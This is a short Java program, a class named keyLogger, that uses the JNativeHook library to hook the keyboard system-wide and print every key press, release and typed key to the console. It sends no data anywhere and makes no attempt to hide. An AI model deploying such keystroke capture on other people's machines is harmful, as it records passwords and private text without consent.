import org.jnativehook.keyboard.NativeKeyListener;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;


public class keyLogger implements NativeKeyListener {
    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
        GlobalScreen.getInstance().addNativeKeyListener(new keyLogger());
    }


    @Override
    public void nativeKeyPressed (NativeKeyEvent e){
        System.out.println("PRESSED:"+NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    @Override
    public void nativeKeyReleased (NativeKeyEvent e){
        System.out.println("REALISED:"+NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    @Override
    public void nativeKeyTyped (NativeKeyEvent e){
        System.out.println("TYPED:"+NativeKeyEvent.getKeyText(e.getKeyCode()));
    }
}